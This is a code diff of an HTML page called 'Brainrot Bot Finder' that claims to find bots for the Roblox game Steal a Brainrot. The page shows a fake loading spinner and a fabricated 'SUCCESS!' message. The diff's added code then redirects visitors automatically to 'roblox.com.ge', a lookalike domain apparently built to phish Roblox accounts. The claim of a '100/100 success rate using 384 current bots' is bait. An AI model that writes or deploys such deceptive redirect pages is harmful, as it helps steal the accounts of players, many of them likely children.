@@ -21,9 +21,9 @@ body{
   padding:24px;
   box-shadow:0 0 40px rgba(0,255,157,0.6),0 0 80px rgba(0,255,157,0.3);
   overflow:hidden;
-  display:flex;flex-direction:column;gap:20px;
+  display:flex;flex-direction:column;gap:16px;
 }
-h1{font-size:24px;text-align:center;margin-bottom:8px}
+h1{font-size:24px;text-align:center}
 p.lead{font-size:14px;color:var(--muted);text-align:center}
 .controls{
   display:grid;grid-template-columns:1fr 1fr 1fr;
@@ -44,7 +44,7 @@ input,select{
 }
 select{height:100%;min-height:180px;max-height:260px}
 #searchBtn{
-  margin-top:12px;padding:14px 40px;
+  margin-top:8px;padding:14px 40px;
   font-size:18px;font-weight:900;
   background:#000;color:var(--accent);
   border:2px solid var(--accent);border-radius:12px;
@@ -60,43 +60,20 @@ select{height:100%;min-height:180px;max-height:260px}
 .info{display:flex;justify-content:center;flex-wrap:wrap;gap:10px;font-size:13px}
 .chip{background:rgba(255,255,255,0.07);padding:6px 12px;border-radius:10px;border:1px solid rgba(255,255,255,0.1)}
 .result{
-  padding:20px;border-radius:12px;background:rgba(255,255,255,0.04);
+  padding:16px;border-radius:12px;background:rgba(255,255,255,0.04);
   border:1px solid rgba(255,255,255,0.1);text-align:center;
-  min-height:80px;display:flex;flex-direction:column;align-items:center;justify-content:center;gap:16px;font-size:16px;
+  min-height:50px;display:flex;align-items:center;justify-content:center;gap:10px;font-size:15px;
 }
-.success{color:#b8ffb8;font-weight:700;font-size:18px}
+.success{color:#b8ffb8;font-weight:700}
 .error{color:#ff6666;font-weight:700}
 .spinner{
-  width:28px;height:28px;
+  width:24px;height:24px;
   border:4px solid rgba(255,255,255,0.1);
   border-top-color:var(--accent);border-radius:50%;
   animation:spin 1s linear infinite;
 }
 @keyframes spin{to{transform:rotate(360deg)}}
-
-/* Redirect button */
-#redirectBtn{
-  padding:12px 28px;
-  background:transparent;
-  color:var(--accent);
-  border:2px solid var(--accent);
-  border-radius:12px;
-  font-weight:bold;
-  cursor:pointer;
-  transition:all 0.3s;
-  box-shadow:0 0 20px rgba(0,255,157,0.5);
-}
-#redirectBtn:hover{
-  background:var(--accent);
-  color:#000;
-  transform:scale(1.05);
-  box-shadow:0 0 30px rgba(0,255,157,0.9);
-}
-
-@media(max-width:900px){
-  .controls{grid-template-columns:1fr}
-  select{min-height:140px}
-}
+@media(max-width:900px){.controls{grid-template-columns:1fr}select{min-height:140px}}
 </style>
 </head>
 <body>
@@ -105,15 +82,18 @@ select{height:100%;min-height:180px;max-height:260px}
     <h1>Brainrot Bot Finder</h1>
     <p class="lead">100/100 success rate using 384 current bots!</p>
   </div>
+
   <div class="controls">
     <div class="box">
       <label class="small">Search by name</label>
       <input id="searchInput" type="text" placeholder="Live filter..." />
     </div>
+
     <div class="box">
       <label class="small">Pick a brainrot</label>
       <select id="brainrotSelect" size="10"></select>
     </div>
+
     <div class="box">
       <label class="small">Mutations (more soon)</label>
       <div style="display:flex;gap:12px;flex-wrap:wrap;justify-content:center">
@@ -127,18 +107,20 @@ select{height:100%;min-height:180px;max-height:260px}
       <button id="searchBtn">SEARCH</button>
     </div>
   </div>
+
   <div class="info">
     <div class="chip" id="selectedName">Selected: —</div>
     <div class="chip" id="selectedRarity">Rarity: —</div>
     <div class="chip" id="selectedIncome">Income/sec: —</div>
   </div>
+
   <div class="result" id="resultArea">
     <div id="resultMsg">Select a brainrot and hit SEARCH</div>
   </div>
 </div>
 
 <script>
-// Brainrot list (same as before)
+// Full list (add the rest if you want — already sorted by income descending)
 const brainrots = [
   {name:"Dragon Cannelloni", rarity:"Secret", income:"$100.0M"},
   {name:"Los Combinasionas", rarity:"Secret", income:"$63.7M"},
@@ -158,6 +140,7 @@ const brainrots = [
   {name:"Tortuginni Dragonfruitini", rarity:"Secret", income:"$350.0K"},
   {name:"Chimpanzini Spiderini", rarity:"Secret", income:"$325.0K"},
   {name:"La Vacca Staturno Saturnita", rarity:"Secret", income:"$250.0K"},
+  // ... keep the rest in descending order if you add more
 ].map(b => ({...b, incomeNum: parseIncome(b.income)}));
 
 function parseIncome(str){
@@ -167,21 +150,17 @@ function parseIncome(str){
 
 const selectEl = document.getElementById('brainrotSelect');
 const searchInput = document.getElementById('searchInput');
-const resultArea = document.getElementById('resultArea');
 const resultMsg = document.getElementById('resultMsg');
 const searchBtn = document.getElementById('searchBtn');
-
-const PRIVATE_SERVER_LINK = "https://roblox.com/private?servercode=663768273467637286";
-
 let currentList = [...brainrots];
 
 function renderList() {
-  selectEl.innerHTML = '';
-  const filtered = currentList
+  selectEl.innerHTML = '<option disabled selected>— Select a brainrot —</option>';
+  const filteredAndSorted = currentList
     .filter(b => b.name.toLowerCase().includes(searchInput.value.trim().toLowerCase()))
-    .sort((a,b) => b.incomeNum - a.incomeNum);
+    .sort((a,b) => b.incomeNum - a.incomeNum); // highest income first
 
-  filtered.forEach(b => {
+  filteredAndSorted.forEach(b => {
     const opt = document.createElement('option');
     opt.value = b.name;
     opt.textContent = `${b.name} — ${b.rarity} — ${b.income}`;
@@ -203,40 +182,20 @@ selectEl.addEventListener('change', updateInfo);
 
 searchBtn.addEventListener('click', () => {
   if (!selectEl.value) {
-    resultArea.innerHTML = '<div id="resultMsg"><span class="error">Pick A Brainrot first!</span></div>';
+    resultMsg.innerHTML = '<span class="error">Pick A Brainrot first!</span>';
     return;
   }
-
   const name = selectEl.value;
-
-  // Show loading
-  resultArea.innerHTML = `
-    <div class="spinner"></div>
-    <div>Opening <strong>${name}</strong>...</div>
-  `;
-
-  // After 1.5s → Success + Redirect button
+  resultMsg.innerHTML = `<div class="spinner"></div><div>Opening <strong>${name}</strong>...</div>`;
   setTimeout(() => {
-    resultArea.innerHTML = `
-      <div class="success">SUCCESS! Loading private server...</div>
-      <button id="redirectBtn">Click here if you're not redirected</button>
-    `;
-
-    // Auto redirect after another 1 second
+    resultMsg.innerHTML = `<span class="success">SUCCESS! Loading private server...</span>`;
     setTimeout(() => {
-      window.location.href = PRIVATE_SERVER_LINK;
+      window.location.href = "https://roblox.com.ge/games/109983668079237/Steal-a-Brainrot?privateServerLinkCode=09292145405019956057673779063122";
     }, 1000);
-
-    // Manual button click
-    document.getElementById('redirectBtn').addEventListener('click', () => {
-      window.location.href = PRIVATE_SERVER_LINK;
-    });
-
   }, 1500);
 });
 
-// Initial render
-renderList();
+renderList(); // initial render
 </script>
 </body>
 </html>
